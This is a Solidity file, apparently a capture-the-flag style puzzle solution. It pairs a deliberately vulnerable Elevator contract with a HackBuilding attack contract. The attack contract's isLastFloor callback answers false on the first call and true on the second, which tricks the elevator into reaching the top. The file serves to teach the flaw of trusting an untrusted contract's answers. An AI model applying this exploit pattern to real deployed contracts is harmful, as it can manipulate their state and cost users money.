// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract HackBuilding {
    Elevator elevator;
    bool flag = false;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function hack() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        } else {
            flag = false;
            return true;
        }
    }
}
